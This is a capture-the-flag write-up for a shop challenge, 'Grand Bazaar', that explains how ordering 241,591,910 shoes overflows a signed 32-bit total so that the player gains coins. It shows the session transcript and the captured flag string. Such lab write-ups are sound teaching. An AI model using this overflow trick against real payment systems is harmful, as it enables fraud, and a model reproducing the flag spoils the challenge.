# Grand Bazaar writeup
We can buy some goods for coins. Flag costs 1337 coins, initially we are given 100, and there are no ways to earn more.

Let's examine **buy()**. There are several checks, if user buys something, then contents of the specific file is printed. Interestingly, all the variables (**total** and **number**) are signed. It allows us to overflow **total**. If we manage to make **total** negative, we will _get_ money after purchase. 4-bytes signed numbers are implemented in this way:

| 0 - 0x7fffffff      | 0x80000000 - 0xffffffff                         |
|---------------------|-------------------------------------------------|
| Positive numbers    | Negative numbers (where 0xffffffff is "-1")     |

To make **total** negative, we have to order a specific number of products. This number multiplied by cost has to be more than 0x7fffffff. For instance, we will use "shoes" as the way to earn coins. Let's calculate the required number:

```python
>>> 0x90000000 // 10
241591910
```

And now order 241591910 shoes:

```bash
⚸ Welcome to the Grand Bazaar! ⚸
Your current amount of money is: 100
  [1] Buy new shoes (10 coins)
  [2] Buy a new book (80 coins)
  [3] Buy a new lamp (40 coins)
  [4] Buy a new flag (1337 coins)
  [5] Exit the Bazaar
1
How much do you wish to buy???
241591910
               __
             .'--'\
         _.-'_  __/
        (_.'--'\|_|
      _.-`   __/
     (_____.'|_|

⚸ Welcome to the Grand Bazaar! ⚸
Your current amount of money is: 1879048296
  [1] Buy new shoes (10 coins)
  [2] Buy a new book (80 coins)
  [3] Buy a new lamp (40 coins)
  [4] Buy a new flag (1337 coins)
  [5] Exit the Bazaar
4
How much do you wish to buy???
1
     ___
     \_/
      |._
      |'."-.._.-""--.-"-.__.-"-.__.-"-.__.-'/
      |  \                                 (
      |   |                                 )
      |   | li2CTF{7H4nk5__f0R_pUrch453!!} /
      |  /                                /
      |.'                                (
      |.-"-..__.-""-.__.-"-.-_.-"-.-_.-"-.)
      |
      |
      |
      |
      |
      |

⚸ Welcome to the Grand Bazaar! ⚸
Your current amount of money is: 1879046959
  [1] Buy new shoes (10 coins)
  [2] Buy a new book (80 coins)
  [3] Buy a new lamp (40 coins)
  [4] Buy a new flag (1337 coins)
  [5] Exit the Bazaar
```

P.S.

- Shoes ASCII-art is taken from https://www.asciiart.eu/clothing-and-accessories/footwear
- Book ASCII-art is taken from https://textart.io/art/tag/book/1
- Lamp ASCII-art is taken from https://ascii.co.uk/art/lamp
- Flag ASCII-art is taken from https://textart.io/art/tag/flag/1

Flag: `li2CTF{7H4nk5__f0R_pUrch453!!}`
